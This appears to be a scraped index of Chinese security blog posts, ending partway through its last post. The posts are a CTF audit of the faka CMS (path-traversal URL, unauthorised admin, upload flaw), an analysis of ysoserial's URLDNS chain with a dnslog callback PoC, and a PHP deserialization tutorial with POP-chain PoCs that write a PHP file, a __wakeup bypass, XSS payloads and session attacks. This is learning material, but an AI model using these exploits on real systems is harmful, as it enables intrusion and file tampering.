题目复盘","text":"半决赛没有做出来，感觉有些遗憾。因此还是决定下来复盘一下。 情景再现比赛时的想法题目源码结构 其实在拿到源码时就不断揣测出题人的意图 题目中的 hint 也给到：www-data 权限用户可写目录只有 runtime 跟 static。所以当时就想好了审计的重点： 各类文件操作函数 + 写入路径可控 RCE + file_put_contents （如果真能RCE，貌似也不用写shell，直接读就行） SQLi 然后 html 下面给到了 1.txt 里面的信息是注册邀请码 当时还以为这么明显的提示一定是暗示什么（结果好像这个txt并没有什么用？），还以为是从index.php/register 利用注册码进去，然后打 /merchant。结果在 /merchant 找了半天也没找到漏洞点。 然后看到跟 html 同级目录下的 tk.sql。 当时找到了md5之后以为能进后台。但是现场还是断网环境（WTF？那我怎么解？）用常见弱密码单向生成后比对也没有发现有相同的。同时还不能爆破后台，也没什么万能密码这类的东西。 然后当时题目环境还是 tp5.0.14。RCE 貌似ban了好多函数。当时妄想通过非预期解一下题目。 最后还是坚信漏洞点在： /merchant 下面。一下午的时间就在 /merchant 的审计和 tp5 RCE 的绕过度过了… 赛后实验室的小伙伴 @jokuuy 告诉我后台部分功能点未授权 orz。而且之前他审过这个 CMS，据说10s可以秒掉23333 反思和小结当时没考虑到未授权…未授权的话可以直接利用很多后台的漏洞（当时就看到了manage/backup 那个点），但是没有进到后台。所以没有能够利用到manage 和 admin 两个目录下的代码。 题目分析获取后台权限http://wdb-vul/index.php/admin/index/info 未授权添加用户 之后访问某些存在漏洞的路由会发生这样的情况 提示权限不够。 在 SQL 列中，authorize 起到了权限限制的作用 回溯 authorize 的控制 application/admin/controller/Index.php#info 跟进 _form， callback 调用 _form_filter 跟进 _form_filter 说明直接 POST 参数即可。 任意文件读取application/manage/controller/Backup.php#downloadBak finename可控，目录穿越 Exp: http://wdb-vul/index.php/manage/backup/downloadBak?file=../../../../../../../../../Users/p2hm1n/Desktop/flag 文件上传发现先知已经有师傅写了一个文件上传的漏洞点了 https://xz.aliyun.com/t/7838 跟着复现分析一波。 application/admin/controller/Plugs.php 主要是文件上传的一些校验。 上传的时候会先调用 upstate，主要作用如下： 将通过 POST 传入的 md5 值以16位字母为间隔进行分割，并拼接传入filename 的后缀 检测文件是否上传 生成 config 数组，并添加每一个键的值 之后调用 upload ，这里看文件上传处理的位置 跟进 move 跟进 buildSaveName final POC 上传至 static 目录","link":"/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/"},{"title":"ysoserial URLDNS 调试分析","text":"以 URLDNS 作为 ysoserial 调试分析的开端，调试环境 JDK 1.8 About URLDNSURLDNS 适用环境： 不依赖第三方库 对无回显反序列化处通过 DNS 请求验证反序列化 执行效果： 不执行命令，只发起一次 DNS 请求 大致浏览其功能后归纳出以下几个问题： URLDNS 是怎么发起 DNS 请求的 为什么能在一个反序列化利用点发起攻击，ysoserial 是怎么做的 这种攻击和之前学的反序列化的重写 readObject 有什么区别 下面进入分析流程 URLDNS POC AnalyseCodeysoserial 给的利用链如下 * Gadget Chain:* HashMap.readObject()* HashMap.putVal()* HashMap.hash()* URL.hashCode() ysoserial Code： public class URLDNS implements ObjectPayload&lt;Object&gt; { public Object getObject(final String url) throws Exception { URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); URL u = new URL(null, url, handler); ht.put(u, url); Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); return ht; } 由于 ysoserial 除了核心利用代码之外涉及很多 ysoserial 工具本身的东西。因此把代码扣出来调试。 这里引用 @啦啦0咯咯 师傅文中代码 package ysoserial;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class URLDNS { public static void main(String[] args) throws Exception { // 创建一个键的类型为 URL， 值的类型为 String 的 hashMap HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); // 上面泛型规定了键的类型，创建一个 URL 类 URL url = new URL(&quot;http://3n5nmt.dnslog.cn&quot;); // hashCode是private修饰，因此反射调用 URL 类的成员变量 Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); // 修改权限 f.setAccessible(true); // 0xdeadbeef 随便设置 f.set(url, 0xdeadbeef); // URLDNS 随便设置 hashMap.put(url, &quot;URLDNS&quot;); f.set(url, -1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); ois.readObject(); }} Analyse -DNS首先回顾这个 POC 的功能 —— 发起 DNS 请求 那么纵观代码可以发现的是除了 ois.readObject(); 之外没有其他的敏感操作了。 思考一下 Java 反序列化漏洞的核心我们不难得知，这段代码一定重写了 readObject。那么向上追溯是哪里重写了 readObject 呢？ java.util.HashMap#readObject 中 putVal(hash(key), key, value, false, false); 这里主要关注 (hash(key) java.util.HashMap#hash 操作意义具体看：https://www.zhihu.com/question/20733617 主要跟进 key.hashCode() java.net.URL#hashCode 这里对 hashCode 有一个判断，要为 -1 才能去触发下面的语句 后续进入 handler.hashCode(), handler 来源于 transient URLStreamHandler handler; java.net.URLStreamHandler#hashCode 这里触发关键的方法 getHostAddress java.net.URLStreamHandler#getHostAddress 这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址。所以变相等于了DNS查询 后面为更深的调用栈 Analyse - hashcode这里主要分析 POC 这段代码 f.set(url, 0xdeadbeef);hashMap.put(url, &quot;URLDNS&quot;);f.set(url, -1); 核心是一个 hashCode 在不同场景下值的问题 控制变量法：先把 f.set(url, 0xdeadbeef); 删除 // URLDNS POCpublic class URLDNS { ··· hashMap.put(url, &quot;URLDNS&quot;);/*** java.util.HashMap#put** 这里关注下面的代码*/public V put(K key, V value) { return putVal(hash(key), key, value, false, true);}/*** java.util.HashMap#hash** 这里关注下面的代码** 可见到了之前分析触发 DNS 的代码*/static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);}/*** java.util.HashMap#hash** 这里 hashCode 为 -1，会触发后续的调用*/public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;}/*** java.net.URLStreamHandler#hashCode** 这里 hashCode 为 -1，会触发后续的调用*/protected int hashCode(URL u) { ··· // Generate the host part. InetAddress addr = getHostAddress(u);/*** java.net.URLStreamHandler#getHostAddress** 这里触发 DNS 请求 ！ 但注意！！！ 这里仅仅是在构造的时候触发的 DNS 请求** 并非反序列化过程中触发！并非反序列化过程中触发！并非反序列化过程中触发！*/protected synchronized InetAddress getHostAddress(URL u) { ··· u.hostAddress = InetAddress.getByName(host); 经过上面的分析我们知道 f.set(url, 0xdeadbeef); 的作用就是避免在生成 POC 的时候触发额外的 DNS 请求，影响我们对反序列化漏洞验证的判断 以我刚刚的例子为例，先看一下此时的 hashCode 接着我们刚刚的分析，再进行控制变量法：把 f.set(url, -1); 删除 直接跳到关键地方，可以看到这里并不为 -1 因此不会进入后续触发 DNS 请求的语句 因此我们得出结论：f.set(url, -1); 的关键作用是控制 hashCode 为 -1 ，从而触发后续 DNS 请求 Analyse - ysoserial POCysoserial 中相比于之前单纯的 POC，利用了一个独特的对象 URLStreamHandler handler = new SilentURLStreamHandler(); 跟进 ysoserial.payloads.URLDNS.SilentURLStreamHandler static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; }}} 通过重写 getHostAddress 的方式去避免在生成 POC 的时候发出 DNS 请求 Referencehttps://www.anquanke.com/post/id/201762 https://payloads.info https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w","link":"/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"},{"title":"再谈PHP反序列化","text":"文章首发于 SECIN社区：https://www.sec-in.com/article/137 三种类属性Private 权限: 正常Private 权限属性名: %00类名%00属性名 。且属性名长度改变Protected 权限属性名: %00*%00属性名 。且属性名长度改变 demo&lt;?php class Test { public $name = &apos;P2hm1n&apos;; private $age = &apos;Secret&apos;; protected $test = &apos;test&apos;;}$test = new Test;$content = serialize($test);file_put_contents(&apos;./flag.txt&apos;, $content);?&gt; 魔术方法具体可参考PHP手册: https://www.php.net/manual/zh/language.oop5.magic.php construct 调用条件 :当一个类被初始化为实例时会调用(unserialize()时不会自动调用)destruct 调用条件 :当对象被销毁时会调用sleep 调用条件 :当一个类调用serialize进行序列化时会自动调用wakeup 调用条件 :当字符串要利用unserialize反序列化成一个类时会调用get() 调用条件:当从不可访问的属性读取数据call()调用条件: 当要调用的方法不存在或权限不足时自动调用invoke()调用条件: 当把一个类当作函数使用时自动调用 tostring 当反序列化后的对象被当作字符串的时候调用。具体调用场景条件如下(引用自 @k0rz3n) (1) echo ($obj) / print($obj) 打印时会触发(2) 反序列化对象与字符串连接时(3) 反序列化对象参与格式化字符串时(4) 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）(5) 反序列化对象参与格式化SQL语句，绑定参数时(6) 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时(7) 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用(8) 反序列化的对象作为 class_exists() 的参数的时候 CVE-2016-7124CVE利用目的: 绕过魔法函数__wakeup 版本限制: PHP5 &lt; 5.6.25 | PHP7 &lt; 7.0.10 核心原理: PHP 内核层解析反序列化漏洞s绕过方法: 当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 Bypass demo &lt;?php class Test { public $name = &apos;P2hm1n&apos;; function __destruct() { echo &apos;Bypass&apos;; } function __wakeup() { echo &apos;fail &apos;; }}$payload = &apos;&apos;;unserialize($payload);?&gt; payloadpayload1 = O:4:&quot;Test&quot;:1:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;}// fail Bypass bypass payloadpayload1 = O:4:&quot;Test&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;}// Bypass POP链构造知识回顾挖掘暗藏ThinkPHP中的反序列利用链 一文中总结的挺好了。 方法名 调用条件 __call 调用不可访问或不存在的方法时被调用 __callStatic 调用不可访问或不存在的静态方法时被调用 __clone 进行对象clone时被调用，用来调整对象的克隆行为 __constuct 构建对象的时被调用； __debuginfo 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本 __destruct 明确销毁对象或脚本结束时被调用； __get 读取不可访问或不存在属性时被调用 __invoke 当以函数方式调用对象时被调用 __isset 对不可访问或不存在的属性调用isset()或empty()时被调用 __set 当给不可访问或不存在属性赋值时被调用 __set_state 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。 __sleep 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用 __toString 当一个类被转换成字符串时被调用 __unset 对不可访问或不存在的属性进行unset时被调用 __wakeup 当使用unserialize时被调用，可用于做些对象的初始化操作 反序列化的常见起点 __wakeup 一定会调用 __destruct 一定会调用 __toString 当一个对象被反序列化后又被当做字符串使用 反序列化的常见中间跳板: __toString 当一个对象被当做字符串使用 __get 读取不可访问或不存在属性时被调用 __set 当给不可访问或不存在属性赋值时被调用 __isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func(); 反序列化的常见终点: __call 调用不可访问或不存在的方法时被调用 call_user_func 一般php代码执行都会选择这里 call_user_func_array 一般php代码执行都会选择这里 主要还是三点： 起点 跳板 代码执行 个人感觉核心是实例化对象可附值给变量,从而调用 + 各类魔术方法 demo1demo引用自 @twosmi1e 师傅 先知社区 里的代码： &lt;?phpclass start_gg{ public $mod1; public $mod2; public function __destruct() { $this-&gt;mod1-&gt;test1(); }}class Call{ public $mod1; public $mod2; public function test1() { $this-&gt;mod1-&gt;test2(); }}class funct{ public $mod1; public $mod2; public function __call($test2,$arr) { $s1 = $this-&gt;mod1; $s1(); }}class func{ public $mod1; public $mod2; public function __invoke() { $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1; } }class string1{ public $str1; public $str2; public function __toString() { $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;; }}$a = $_GET[&apos;string&apos;];unserialize($a);?&gt; 从前往后跟 or 从后往前跟？ POC &lt;?phpclass start_gg{ public $mod1; public $mod2; public function __construct() { $this-&gt;mod1 = new Call(); } public function __destruct() { $this-&gt;mod1-&gt;test1(); # 入口点，mod1可通过附值起跳。 }}class Call{ public $mod1; # 实例化funct public $mod2; # 无它什么事 # 继续起跳，瞻前顾后，思考下面的 $this-&gt;mod1-&gt;test2();会在何处被什么利用 public function __construct() { $this-&gt;mod1 = new funct(); } public function test1() { $this-&gt;mod1-&gt;test2(); # 这里调 __call }}class funct{ public $mod1; # 实例化func public $mod2; # 无它什么事 public function __construct() { $this-&gt;mod1 = new func(); } public function __call($test2, $arr) { $s1 = $this-&gt;mod1; $s1(); # 这里触发 __invoke }}class func{ public $mod1; # 实例化string1 public $mod2; # __invoke对其附值，其实是为了调 __toString public function __construct() { $this-&gt;mod1 = new string1(); } public function __invoke() { $this-&gt;mod2 = &quot;字符串拼接&quot; . $this-&gt;mod1; # 这里若拼接则会触发 __toString }}class string1{ public $str1; # 实例化 GetFlag public $str2; public function __construct() { $this-&gt;str1 = new GetFlag(); } public function __toString() { $this-&gt;str1-&gt;get_flag(); #调用此处即可getflag，难点：需调用 __toString return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo &quot;flag:&quot; . &quot;xxxxxxxxxxxx&quot;; }}$payload = new start_gg();echo urlencode(serialize($payload));?&gt; demo2demo引用自 @l3mon师傅 blog 里的代码： &lt;?phpclass OutputFilter { protected $matchPattern; protected $replacement; function __construct($pattern, $repl) { $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; } function filter($data) { return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); }};class LogFileFormat { protected $filters; protected $endl; function __construct($filters, $endl) { $this-&gt;filters = $filters; $this-&gt;endl = $endl; } function format($txt) { foreach ($this-&gt;filters as $filter) { $txt = $filter-&gt;filter($txt); } $txt = str_replace(&apos;\\n&apos;, $this-&gt;endl, $txt); return $txt; }};class LogWriter_File { protected $filename; protected $format; function __construct($filename, $format) { $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename)); $this-&gt;format = $format; } function writeLog($txt) { $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(&quot;C:\\\\WWW\\\\test\\\\ctf\\\\kon\\\\&quot; . $this-&gt;filename, $txt, FILE_APPEND); }};class Logger { protected $logwriter; function __construct($writer) { $this-&gt;logwriter = $writer; } function log($txt) { $this-&gt;logwriter-&gt;writeLog($txt); }};class Song { protected $logger; protected $name; protected $group; protected $url; function __construct($name, $group, $url) { $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $fltr = new OutputFilter(&quot;/\\[i\\](.*)\\[\\/i\\]/i&quot;, &quot;&lt;i&gt;\\\\1&lt;/i&gt;&quot;); $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\\n&quot;))); } function __toString() { return &quot;&lt;a href=&apos;&quot; . $this-&gt;url . &quot;&apos;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group; } function log() { $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\\n&quot;); } function get_name() { return $this-&gt;name; }}class Lyrics { protected $lyrics; protected $song; function __construct($lyrics, $song) { $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; } function __toString() { return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\\n&quot;; } function __destruct() { $this-&gt;song-&gt;log(); } function shortForm() { return &quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&apos;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;; } function name_is($name) { return $this-&gt;song-&gt;get_name() === $name; }};class User { static function addLyrics($lyrics) { $oldlyrics = array(); if (isset($_COOKIE[&apos;lyrics&apos;])) { $oldlyrics = unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie(&apos;lyrics&apos;, base64_encode(serialize($oldlyrics))); } static function getLyrics() { if (isset($_COOKIE[&apos;lyrics&apos;])) { return unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } else { setcookie(&apos;lyrics&apos;, base64_encode(serialize(array(1, 2)))); return array(1, 2); } }};class Porter { static function exportData($lyrics) { return base64_encode(serialize($lyrics)); } static function importData($lyrics) { return serialize(base64_decode($lyrics)); }};class Conn { protected $conn; function __construct($dbuser, $dbpass, $db) { $this-&gt;conn = mysqli_connect(&quot;localhost&quot;, $dbuser, $dbpass, $db); } function getLyrics($lyrics) { $r = array(); foreach ($lyrics as $lyric) { $s = intval($lyric); $result = $this-&gt;conn-&gt;query(&quot;SELECT data FROM lyrics WHERE id=$s&quot;); while (($row = $result-&gt;fetch_row()) != NULL) { $r []= unserialize(base64_decode($row[0])); } } return $r; } function addLyrics($lyrics) { $ids = array(); foreach ($lyrics as $lyric) { $this-&gt;conn-&gt;query(&quot;INSERT INTO lyrics (data) VALUES (\\&quot;&quot; . base64_encode(serialize($lyric)) . &quot;\\&quot;)&quot;); $res = $this-&gt;conn-&gt;query(&quot;SELECT MAX(id) FROM lyrics&quot;); $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]); } echo var_dump($ids); return $ids; } function __destruct() { $this-&gt;conn-&gt;close(); $this-&gt;conn = NULL; }};unserialize($_GET[&apos;cmd&apos;]); 反序列化函数 + 可控参数 == 控制当前作用域下对象 class User { static function addLyrics($lyrics) { $oldlyrics = array(); if (isset($_COOKIE[&apos;lyrics&apos;])) { $oldlyrics = unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie(&apos;lyrics&apos;, base64_encode(serialize($oldlyrics))); } static function getLyrics() { if (isset($_COOKIE[&apos;lyrics&apos;])) { return unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } else { setcookie(&apos;lyrics&apos;, base64_encode(serialize(array(1, 2)))); return array(1, 2); } }}; 自定义 $song 值 + __destruct == 调用当前作用域下 log方法 class Lyrics { protected $lyrics; protected $song; function __construct($lyrics, $song) { $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; } function __toString() { return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\\n&quot;; } function __destruct() { $this-&gt;song-&gt;log(); } function shortForm() { return &quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&apos;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;; } function name_is($name) { return $this-&gt;song-&gt;get_name() === $name; }}; 论两个 log 方法的选择 class Logger { protected $logwriter; function __construct($writer) { $this-&gt;logwriter = $writer; } function log($txt) { $this-&gt;logwriter-&gt;writeLog($txt); }};class Song { protected $logger; protected $name; protected $group; protected $url; function __construct($name, $group, $url) { $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $fltr = new OutputFilter(&quot;/\\[i\\](.*)\\[\\/i\\]/i&quot;, &quot;&lt;i&gt;\\\\1&lt;/i&gt;&quot;); $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\\n&quot;))); } function __toString() { return &quot;&lt;a href=&apos;&quot; . $this-&gt;url . &quot;&apos;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group; } function log() { $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\\n&quot;); } function get_name() { return $this-&gt;name; }} LogWriter_File::writeLog($txt) 的写入文件 class LogWriter_File { protected $filename; protected $format; function __construct($filename, $format) { $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename)); $this-&gt;format = $format; } function writeLog($txt) { $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(&quot;C:\\\\WWW\\\\test\\\\ctf\\\\kon\\\\&quot; . $this-&gt;filename, $txt, FILE_APPEND); }}; LogFileFormat::format class LogFileFormat { protected $filters; protected $endl; function __construct($filters, $endl) { $this-&gt;filters = $filters; $this-&gt;endl = $endl; } function format($txt) { foreach ($this-&gt;filters as $filter) { $txt = $filter-&gt;filter($txt); } $txt = str_replace(&apos;\\n&apos;, $this-&gt;endl, $txt); return $txt; }}; OutputFilter::filter 自定义 preg_replace 内容 class OutputFilter { protected $matchPattern; protected $replacement; function __construct($pattern, $repl) { $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; } function filter($data) { return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); }}; preg_replace 和 str_replace 的区别 final POC &lt;?phpclass OutputFilter { protected $matchPattern; protected $replacement; function __construct() { $this-&gt;matchPattern = &quot;//&quot;; $this-&gt;replacement = &quot;&lt;?php phpinfo();?&gt;&quot;; }}class LogFileFormat { protected $filters; protected $endl; function __construct() { $this-&gt;filters = array(new OutputFilter()); # foreach ($this-&gt;filters as $filter) $this-&gt;endl = &apos;\\n&apos;; }}class LogWriter_File { protected $filename; protected $format; function __construct() { $this-&gt;filename = &quot;info.php&quot;; $this-&gt;format = new LogFileFormat(); }}class Logger { protected $logwriter; function __construct() { $this-&gt;logwriter = new LogWriter_File(); }}class Lyrics { protected $lyrics; protected $song; function __construct() { $this-&gt;lyrics = &apos;1&apos;; $this-&gt;song = new Logger(); }}$payload = new Lyrics();print_r(urlencode(serialize($payload)));?&gt; 原生类利用ZipArchive::open@Threezh1 文中已经写的很详细了。这里不再补充https://xz.aliyun.com/t/6454#toc-10 SoapClient关于SOAP安全问题：https://www.anquanke.com/post/id/153065#h2-1 利用条件：需要有soap扩展，且不是默认开启，需要手动开启需要调用一个不存在的方法触发其__call()函数 仅限于http/https协议，且http头部还存在crlf漏洞(SOAP + CRLF = SSRF) 例子可见下文: LCTF2018-bestphp’s revenge Error XSS@l3m0n 师傅blog中提到了XSS Error适用于php7版本 XSS开启报错的情况下:&lt;?php$a = new Error(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);//Test$t = urldecode(&apos;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&apos;);$c = unserialize($t);echo $c; Exception XSS@l3m0n 师傅blog中提到了XSS Exception适用于php5、7版本 XSS开启报错的情况下:&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);//Test$c = urldecode(&apos;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&apos;);echo unserialize($c); 多种姿势组合拳例子可见:Pornhub某漏洞 ： https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1 涉及姿势如下可获取目录： DirectoryIteratorXXE： SimpleXMLElement创建空白文件： SQLite3 反序列化字符逃逸原理: 对类中不存在的属性也会进行反序列化。且PHP 在反序列化时，底层代码是以 ;作为字段的分隔，以 }作为结尾(字符串除外)，并且是根据长度判断内容的 利用: 构造字符串 例子一0ctf2016 一道web题（待更新 例子二安洵杯 - easy_serialize_phphttps://xz.aliyun.com/t/6911#toc-3 Session 反序列化参数相关session相关参数配置 Directive 含义 session.save_handler session保存形式。默认为files session.save_path 设置session的存储路径,默认在/tmp session.serialize_handler session序列化存储所用处理器。默认为php。 session.upload_progress.cleanup 一旦读取了所有POST数据，立即清除进度信息。默认开启 session.upload_progress.enabled 将上传文件的进度信息存在session中。默认开启。 PHP处理器三种序列化方式 处理器 对应的存储格式 php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 php 键名＋竖线＋经过serialize()函数反序列处理的值 php_serialize serialize()函数反序列处理数组方式 差异性PHP处理器差异性如下&lt;?phpini_set(&apos;session.serialize_handler&apos;,&apos;&apos;);session_start();$_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];?&gt;URL传参，?name=P2hm1n。session以文本存储方式保存在 /tmp 目录下。 php: name|s:6:&quot;P2hm1n&quot;;php_binary: \u0004二进制字符names:6:&quot;P2hm1n&quot;;php_serialize: a:1:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;} 漏洞核心也体现在 差异性 三个字 Q: 什么是差异性:A: 选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。 攻击手段trick-1利用前提: 脚本中设置的序列化处理器与php.ini设置的不同 常见漏洞场景: php_serilize 方式存入，解析又是用的 php 处理器 利用原理： php 在获取 session 的时候，会按照session.serialize_handler=php 规则来处理 session 文件。把 | 前面的值作为一个session键名，对 | 后面就会进行一个反序列化操作 trick-2配置不当可造成session被控。 当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$_SESSION中。 但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时(session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。 session.upload_progress.cleanup关闭。这就 极大提高了漏洞的利用成功率。如果此选项session.upload_progress.cleanup打开，那么在利用时攻击者需要上传large and crash文件，来使得我们传入的data得以执行。 详情见https://bugs.php.net/bug.php?id=71101 例子一题目链接: http://web.jarvisoj.com:32784/index.php &lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO{ public $mdzz; function __construct() { $this-&gt;mdzz = &apos;phpinfo();&apos;; } function __destruct() { eval($this-&gt;mdzz); }}if(isset($_GET[&apos;phpinfo&apos;])){ $m = new OowoO();}else{ highlight_string(file_get_contents(&apos;index.php&apos;));}?&gt; 差异点: phpinfo中 session.serialize_handler = php_serialize。 题目中 ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;); 核心目的: 进入 eval 函数执行命令。由于题目中并没有反序列化操作，其中 $this-&gt;mdzz 不可通过常规手段控制。 观察phpinfo中session其他有关信息 构造一个上传的页面&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;change&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 构造poc &lt;?phpclass OowoO{ public $mdzz;}$a = new OowoO();$a-&gt;mdzz = &quot;payload&quot;;echo serialize($a);?&gt; 扫描目录 phpinfo中的_SERVER[&quot;SCRIPT_FILENAME&quot;]字段得到路径：/opt/lampp/htdocs/。 随后用绝对路径读取文件 例子二题目来源: LCTF2018-bestphp’s revenge 题目给了两个源码 index.php &lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name])){ $_SESSION[name] = $_GET[name];}var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a);?&gt; flag.php &lt;?phpsession_start();echo &apos;only localhost can get flag!&apos;;$flag = &apos;LCTF{*************************}&apos;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){ 